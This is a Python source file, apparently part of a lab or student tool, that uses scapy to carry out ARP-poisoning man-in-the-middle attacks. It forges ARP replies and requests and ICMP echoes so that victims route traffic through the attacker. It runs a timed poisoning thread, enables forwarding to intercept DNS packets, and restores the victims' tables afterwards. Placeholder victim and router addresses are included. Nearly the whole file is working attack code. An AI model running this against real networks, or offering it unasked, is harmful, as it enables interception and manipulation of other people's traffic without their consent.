from scapy.all import *
from Forward import *
from DNS import *
import threading
from config import config

# Forges an ICMP echo request, used for Solaris systems
# Creates an ARP entry for the [src_ip] on the destination device
def forge_icmp_echo_request(src_ip, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / IP(src=src_ip, dst=dst_ip) / ICMP(type="echo-request")

# Forges an ARP reply
def forge_arp_reply(src_ip, src_mac, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / ARP(
		op=2,
		psrc=src_ip,
		pdst=dst_ip,
		hwsrc=src_mac,
		hwdst=dst_mac
	)

# Forges an ARP request, used for linux kernel 2.4.x
# Sends a spoofed ARP request to create an entry in the cache
def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / ARP(
		op=1,
		psrc=src_ip,
		pdst=dst_ip,
		hwsrc=src_mac,
    	hwdst="00:00:00:00:00:00"
	)
	
def poison_loop(forged_packets, interface, iterations, stop_event):
	i = 1
	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
	while not stop_event.is_set() and (iterations == 0 or i <= iterations):
		# Send packets based on the config settings
		print("Sending poison packets...")
		sendp(forged_packets, iface=interface, verbose=False)

		# For the first 5 poison batches use the warm up delay
		if i < 5:
			# Check if thread should stop every 1 second
			for j in range(config.arp_poison_warm_up):
				time.sleep(1)
				if stop_event.is_set():
					return
		else:
			# Check if thread should stop every 1 second
			for j in range(config.arp_poison_delay):
				time.sleep(1)
				if stop_event.is_set():
					return
		i += 1
	
def start_arp_mitm(group1, group2, self_mac, interface):
	# create a list of each forged responses
	# every device in group1 gets the devices in group2 spoofed by this device
	# if one way poisoning is not enabled, then the other way around as well
	forged_packets = []

	for (ip1, mac1) in group1:
		for (ip2, mac2) in group2:
			if (ip1, mac1) != (ip2, mac2):
				# ICMP echo request
				if config.arp_poison_icmp:
					forged_packets.append(forge_icmp_echo_request(ip2, ip1, mac1))
					if not config.arp_poison_oneway:
						forged_packets.append(forge_icmp_echo_request(ip1, ip2, mac2))

				# ARP reply
				if config.arp_poison_reply:
					forged_packets.append(forge_arp_reply(ip2, self_mac, ip1, mac1))
					if not config.arp_poison_oneway:
						forged_packets.append(forge_arp_reply(ip1, self_mac, ip2, mac2))

				# ARP request
				if config.arp_poison_request:
					forged_packets.append(forge_arp_request(ip2, self_mac, ip1, mac1))
					if not config.arp_poison_oneway:
						forged_packets.append(forge_arp_request(ip1, self_mac, ip2, mac2))

	# event to signal that the poison_loop thread should stop
	stop_event = threading.Event()

	thread = threading.Thread(target=poison_loop, args=(forged_packets, interface, 0, stop_event), daemon=True)

	thread.start()

	return thread, stop_event

	# todo find good timings for sending poison/stealth mode(?) (base on OS?)

    
def stop_arp_mitm(thread, group1, group2, stop_event, interface):
	print("Stopping ARP poisoning thread...")
	# signal the poison thread to stop
	stop_event.set()
	thread.join()

	# create forged packets to restore the arp tables of the victims to the valid values
	forged_packets = []

	for (ip1, mac1) in group1:
		for (ip2, mac2) in group2:
			if (ip1, mac1) != (ip2, mac2):
				# ARP reply
				if config.arp_poison_reply:
					forged_packets.append(forge_arp_reply(ip2, mac1, ip1, mac1))
					if not config.arp_poison_oneway:
						forged_packets.append(forge_arp_reply(ip1, mac1, ip2, mac2))

				# ARP request
				if config.arp_poison_request:
					forged_packets.append(forge_arp_request(ip2, mac1, ip1, mac1))
					if not config.arp_poison_oneway:
						forged_packets.append(forge_arp_request(ip1, mac1, ip2, mac2))

	print("Re-poisoning the victims to restore the valid ARP entries...")
	# create a new stop_event for the repoisoning
	stop_event = threading.Event()
	# run the poison loop 3 times to restore the valid entries
	poison_loop(forged_packets, interface, 3, stop_event)
	
def only_dns(pkt):
	return pkt.haslayer(DNS)

def print_fn(pkt, ips, interface):
	print(f"src: {pkt[Ether].src}")
	print(f"summary: {pkt.summary()}")
	# spoof_dns(pkt, victim_ip, router_ip, interface)
	
def start_attack(group1, group2, self_ip, self_mac, interface):
	enable_kernel_forwarding(interface)

	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)
		
	# Temp: make this function later	
	# run("iptables -I FORWARD -p udp --dport 53 -j DROP")
	# run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
		
	intercept_pkts(group1, group2, self_mac, interface, only_dns, print_fn)

	input("\nstop")

	stop_arp_mitm(thread, group1, group2, stop_event, interface)
	cleanup_forward(interface)

# placeholder
victim_ip = "192.168.1.101"
victim_mac = "00:0c:29:d8:3b:bf"
router_ip = "192.168.1.1"
router_mac = "00:0c:29:87:40:17"
self_ip = "192.168.1.100"
self_mac = "00:0c:29:ef:9c:1d"
interface = "eth0"
group1 = [(victim_ip, victim_mac)]
group2 = [(router_ip, router_mac)]

# start the attack with the placeholder values to avoid having to go through discovery every time for testing
# start_attack(group1, group2, self_ip, self_mac, interface)